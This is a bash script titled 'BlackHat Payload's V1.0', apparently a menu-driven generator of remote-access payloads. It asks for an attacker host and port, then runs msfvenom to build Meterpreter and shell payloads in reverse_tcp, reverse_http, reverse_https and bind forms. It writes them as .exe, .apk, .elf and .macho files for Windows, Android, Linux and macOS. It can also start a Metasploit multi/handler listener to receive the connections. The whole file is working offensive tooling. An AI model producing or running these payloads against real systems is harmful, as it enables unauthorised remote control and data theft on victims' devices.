#!/bin/bash
# Banner
blackhat () {
  echo -e "\t\e[96m
    \t  ███╗   ███╗██████╗    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗  ██╗ █████╗ ████████╗
    \t  ████╗ ████║██╔══██╗   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║  ██║██╔══██╗╚══██╔══╝
    \t  ██╔████╔██║██████╔╝   ██████╔╝██║     ███████║██║     █████╔╝ ███████║███████║   ██║
    \t  ██║╚██╔╝██║██╔══██╗   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██║   ██║
    \t  ██║ ╚═╝ ██║██║  ██║██╗██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║   ██║
    \t  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝\e[0m
    \t                                        BlackHat Payload's V1.0
    \t                                        Coded by \e[92m\e[1mAbinash Raju\e[0m\e[0m
";

}
# informations
info (){
  echo
  echo -e "\e[1m\e[96m[*] Mr.BlackHat:~/LHOST#\e[0m\e[0m\c"
  read ip
  echo
  echo -e "\e[1m\e[96m[*] Mr.BlackHat:~/LPORT#\e[0m\e[0m\c"
  read port
  echo
  echo -e "\e[1m\e[96m[*] Mr.BlackHat:~/FileName#\e[0m\e[0m \c"
  read file
}
# Windows Payloads
windows (){
  clear
  blackhat
  echo -e "\n"
  sleep 0.3
  echo -e "+-------------------------------------------------------+"
  echo -e "+          \e[96m\e[1mAvailable Payloads for Windows\e[0m\e[0m               +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo -ne
  echo -e "+        [1] windows/meterpreter/reverse_tcp            +"
  echo -e "+        [2] windows/meterpreter/reverse_http           +"
  echo -e "+        [3] windows/meterpreter/reverse_https          +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo
  echo -ne "\e[1m\e[96m[#] Choose a payload:\e[0m\e[0m \c"
  read payload1
  echo

  case $payload1 in

    1)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $file.exe
    payload='windows/meterpreter/reverse_tcp' ;;

    2)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f exe > $file.exe
    payload='windows/meterpreter/reverse_http' ;;

    3)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > $file.exe
    payload='windows/meterpreter/reverse_https' ;;

    *)
    echo -e "\e[92m\e[1m[*] Enter Valid Option....!\e[0m\e[0m"
    sleep 0.5
    echo -e "\e[92m\e[1m[*] Exiting........\e[0m\e[0m"
    sleep 0.2
    exit ;;
  esac
}

# Android Payloads
android (){
  clear
  blackhat
  echo -e "\n"
  sleep 0.3
  echo -e "+-------------------------------------------------------+"
  echo -e "+          \e[96m\e[1mAvailable Payloads for Android\e[0m\e[0m               +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo -ne
  echo -e "+        [1] android/meterpreter/reverse_tcp            +"
  echo -e "+        [2] android/meterpreter/reverse_http           +"
  echo -e "+        [3] android/meterpreter/reverse_https          +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo
  echo -ne "\e[1m\e[96m[#] Choose a payload:\e[0m\e[0m \c"
  read payload2
  echo

  case $payload2 in

    1)
    info
    echo
    echo -ne "\e[31mWait for Creating Your Payload\e[0m..."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > apk > $file.apk
    payload='android/meterpreter/reverse_tcp' ;;

    2)
    info
    echo
    echo -ne "\e[31mWait for Creating Your Payload\e[0m..."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port R > apk > $file.apk
    payload='android/meterpreter/reverse_http' ;;

    3)
    info
    echo
    echo -ne "\e[31mWait for Creating Your Payload\e[0m..."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$port R > apk > $file.apk
    payload='android/meterpreter/reverse_https' ;;

    *)
    echo -e "\e[92m\e[1m[*] Enter Valid Option....!\e[0m\e[0m"
    sleep 0.5
    echo -e "\e[92m\e[1m[*] Exiting.......\e[0m\e[0m"
    sleep 0.2
    exit ;;
  esac
}
# Linux Payloads
linux (){
  clear
  blackhat
  echo -e "\n"
  sleep 0.3
  echo -e "+-------------------------------------------------------+"
  echo -e "+          \e[96m\e[1mAvailable Payloads for Linux\e[0m\e[0m                 +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo -ne
  echo -e "+        [1] linux/x86/meterpreter/reverse_tcp          +"
  echo -e "+        [2] linux/x86/meterpreter/bind_tcp             +"
  echo -e "+        [3] generic/shell_bind_tcp                     +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo
  echo -ne "\e[1m\e[96m[#] Choose a payload:\e[0m\e[0m \c"
  read payload3
  echo

  case $payload3 in

    1)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
    payload='linux/x86/meterpreter/reverse_tcp' ;;

    2)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
    payload='linux/x86/meterpreter/bind_tcp' ;;

    3)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p generic/shell_bind_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
    payload='generic/shell_bind_tcp' ;;

    *)
    echo -e "\e[92m\e[1m[*] Enter Valid Option....!\e[0m\e[0m"
    sleep 0.5
    echo -e "\e[92m\e[1m[*] Exiting.......\e[0m\e[0m"
    sleep 0.2
    exit ;;
  esac
}

# Mac Payloads
mac (){
  clear
  blackhat
  echo -e "\n"
  sleep 0.3
  echo -e "+-------------------------------------------------------+"
  echo -e "+          \e[96m\e[1mAvailable Payloads for Mac\e[0m\e[0m                   +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo -ne
  echo -e "+        [1] osx/x86/shell_reverse_tcp                  +"
  echo -e "+        [2] osx/x86/shell_bind_tcp                     +"
  echo -e "+-------------------------------------------------------+"
  sleep 0.3
  echo
  echo -ne "\e[1m\e[96m[#] Choose a payload:\e[0m\e[0m \c"
  read payload4
  echo

  case $payload4 in

    1)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $file.macho
    payload='osx/x86/shell_reverse_tcp' ;;

    2)
    info
    echo
    echo -ne "Wait for Creating Your Payload"; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".!"
    echo
    sudo msfvenom -p osx/x86/shell_bind_tcp LHOST=$ip LPORT=$port -f macho > $file.macho
    payload='osx/x86/shell_bind_tcp' ;;

    *)
    echo -e "\e[92m\e[1m[*] Enter Valid Option....!\e[0m"
    sleep 0.5
    echo -e "\e[92m\e[1m[*] Exiting.......\e[0m\e[0m"
    sleep 0.2
    exit ;;
  esac
}

clear
blackhat
echo -e "\n"
sleep 0.3
echo -e "+-------------------------------------------------------+"
echo -e "+          \e[96m\e[1mAvailable Payloads for OperatingSystem\e[0m\e[0m       +"
echo -e "+-------------------------------------------------------+"
sleep 0.3
echo -ne
echo -e "+                    [1] Windows                        +"
echo -e "+                    [2] Android                        +"
echo -e "+                    [3] Linux                          +"
echo -e "+                    [4] Mac                            +"
echo -e "+-------------------------------------------------------+"
sleep 0.3
echo
echo -e "\e[1m\e[96m[*] Enter Your Option:\e[0m\e[0m \c"
read opt

case  $opt  in

    1)
    windows;;

    2)
    android ;;

    3)
    linux ;;

    4)
    mac;;

    * )
    echo
    echo -e "\e[92m\e[1m[*] Enter Valid Option.....!\e[0m\e[0m"
    sleep 1
    echo
    echo -e "\e[92m\e[1m[*] Exiting.......\e[0m\e[0m"
    sleep 0.2
    exit ;;
esac

sleep 0.3
echo -ne "\e[31m\e[1m[#] Do you Start the listener? [Yy/Nn]:\e[0m\e[0m \c"
read listener
if [ $listener  =  "y" ]
then
    clear
    echo -ne "\e[1m[*] Starting the MetasplOit Framework\e[0m....";sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ".";echo -ne ".!\n"
    echo
    msfconsole -q -x "use multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit "
elif [ $listener  =  "n" ]
then
    echo -ne "\e[31m\e[1m[*] Thankyou for Using My Tool\e[0m\e[0m....";sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne "."; sleep 0.2 ;sleep 0.2 ;echo -ne "."; sleep 0.2 ;echo -ne ":";echo -ne "-)\n"
    sleep 0.2
    exit
else
    echo -e "\e[92m\e[1m[*] Enter Valid Option......!\e[0m\e[0m"
    sleep 0.2
    echo -e "\e[92m\e[1m[*] Exiting.......\e[0m\e[0m"
    sleep 0.2
    exit
fi
